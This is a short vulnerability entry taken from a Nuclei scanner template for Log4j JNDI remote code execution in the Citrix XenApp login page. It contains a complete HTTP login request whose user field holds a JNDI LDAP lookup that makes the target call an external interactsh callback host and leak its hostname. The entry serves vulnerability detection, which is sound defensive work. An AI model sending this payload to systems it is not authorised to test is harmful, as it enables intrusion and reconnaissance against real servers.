# Vulnerability: Citrix XenApp - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`citrix-xenapp-log4j-rce.yaml`)

## Description
Citrix XenApp is susceptible to Log4j JNDI remote code execution. Citrix Virtual Apps is an application virtualization software produced by Citrix Systems that allows Windows applications to be accessed via individual devices from a shared server or cloud system.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Citrix/XenApp/auth/login.aspx HTTP/1.1
Host: {{Hostname}}
Cookie: WIClientInfo="clientConnSecure#false";
Origin: {{RootURL}}
Referer: {{RootURL}}/Citrix/XenApp/auth/login.aspx?CTX_MessageType=WARNING&CTX_MessageKey=NoUsableClientDetected
Content-Type: application/x-www-form-urlencoded

LoginType=Explicit&user=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
```

